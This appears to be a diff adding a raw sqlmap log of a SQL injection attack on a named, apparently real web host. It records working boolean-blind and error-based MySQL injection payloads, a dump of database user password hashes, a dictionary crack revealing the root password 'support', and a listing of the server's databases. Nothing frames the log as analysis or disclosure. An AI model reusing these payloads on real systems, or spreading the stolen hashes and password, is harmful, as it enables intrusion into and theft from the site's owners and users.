@@ -1,0 +1,107 @@
+Parameter: number (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: number=87829465777' RLIKE (SELECT (CASE WHEN (4494=4494) THEN 87829465777 ELSE 0x28 END)) AND 'QuLr'='QuLr&id=0
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: number=87829465777' AND (SELECT 2323 FROM(SELECT COUNT(*),CONCAT(0x7171626271,(SELECT (ELT(2323=2323,1))),0x71627a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'ZsEV'='ZsEV&id=0
+---
+[15:10:01] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux CentOS
+web application technology: Apache 2.4.6, PHP 5.4.16
+back-end DBMS: MySQL >= 5.0
+[15:10:01] [INFO] fetching server hostname
+[15:10:01] [INFO] resumed: xl1
+hostname:    'xl1'
+[15:10:01] [INFO] fetching database users password hashes
+[15:10:01] [INFO] the SQL query used returns 13 entries
+[15:10:01] [INFO] retrieved: bubble
+[15:10:01] [INFO] retrieved: *748C78DA84266E6825ADDF0887831A044D52CC0B
+[15:10:01] [INFO] retrieved: root
+[15:10:01] [INFO] retrieved: *748C78DA84266E6825ADDF0887831A044D52CC0B
+[15:10:01] [INFO] retrieved: support
+[15:10:01] [INFO] retrieved: *748C78DA84266E6825ADDF0887831A044D52CC0B
+[15:10:01] [INFO] retrieved: root
+[15:10:01] [INFO] retrieved:
+[15:10:01] [INFO] retrieved: root
+[15:10:01] [INFO] retrieved:
+[15:10:01] [INFO] retrieved: support
+[15:10:01] [INFO] retrieved: *748C78DA84266E6825ADDF0887831A044D52CC0B
+[15:10:01] [INFO] retrieved: root
+[15:10:01] [INFO] retrieved: *748C78DA84266E6825ADDF0887831A044D52CC0B
+[15:10:02] [INFO] retrieved:
+[15:10:02] [INFO] retrieved: *748C78DA84266E6825ADDF0887831A044D52CC0B
+[15:10:02] [INFO] retrieved: bubble
+[15:10:02] [INFO] retrieved: *13F84CC62636F799FE455B4B4BD45DB6C02F599B
+[15:10:02] [INFO] retrieved: root
+[15:10:02] [INFO] retrieved: *13F84CC62636F799FE455B4B4BD45DB6C02F599B
+[15:10:02] [INFO] retrieved: support
+[15:10:02] [INFO] retrieved: *13F84CC62636F799FE455B4B4BD45DB6C02F599B
+[15:10:02] [INFO] retrieved:
+[15:10:02] [INFO] retrieved: *894A0E091E1CD901CAEF2983002F13A99BCD6DC2
+[15:10:02] [INFO] retrieved: root
+[15:10:02] [INFO] retrieved: *894A0E091E1CD901CAEF2983002F13A99BCD6DC2
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
+[15:10:04] [INFO] writing hashes to a temporary file '/tmp/sqlmap1Gc3oR11142/sqlmaphashes-UcVruc.txt'
+do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q]
+[15:10:06] [INFO] using hash method 'mysql_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/root/.cache/sqlmap/txt/wordlist.zip' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+>
+[15:10:07] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N]
+[15:10:09] [INFO] starting dictionary-based cracking (mysql_passwd)
+[15:10:09] [INFO] starting 4 processes
+[15:10:31] [INFO] cracked password 'support' for user 'root'
+database management system users password hashes:
+[*] bubble [2]:
+    password hash: *13F84CC62636F799FE455B4B4BD45DB6C02F599B
+    clear-text password: support
+    password hash: *748C78DA84266E6825ADDF0887831A044D52CC0B
+[*] root [4]:
+    password hash: *13F84CC62636F799FE455B4B4BD45DB6C02F599B
+    clear-text password: support
+    password hash: *748C78DA84266E6825ADDF0887831A044D52CC0B
+    password hash: *894A0E091E1CD901CAEF2983002F13A99BCD6DC2
+    password hash: NULL
+[*] support [2]:
+    password hash: *13F84CC62636F799FE455B4B4BD45DB6C02F599B
+    clear-text password: support
+    password hash: *748C78DA84266E6825ADDF0887831A044D52CC0B
+
+[15:10:37] [INFO] fetched data logged to text files under '/root/.sqlmap/output/xlcuaps.xl.co.id'
+
+[*] shutting down at 15:10:37
+
+
+
+[15:11:32] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux CentOS
+web application technology: Apache 2.4.6, PHP 5.4.16
+back-end DBMS: MySQL >= 5.0
+[15:11:32] [INFO] fetching current user
+[15:11:32] [INFO] retrieved: root@%
+current user:    'root@%'
+[15:11:32] [INFO] fetching current database
+[15:11:32] [INFO] retrieved: db_bblog
+current database:    'db_bblog'
+[15:11:32] [INFO] fetching server hostname
+[15:11:32] [INFO] resumed: xl1
+hostname:    'xl1'
+
+
+
+available databases [10]:
+[*] backup
+[*] db_bblog
+[*] db_bcare
+[*] db_bcore
+[*] db_support
+[*] information_schema
+[*] mcurium
+[*] mysql
+[*] test
+[*] web
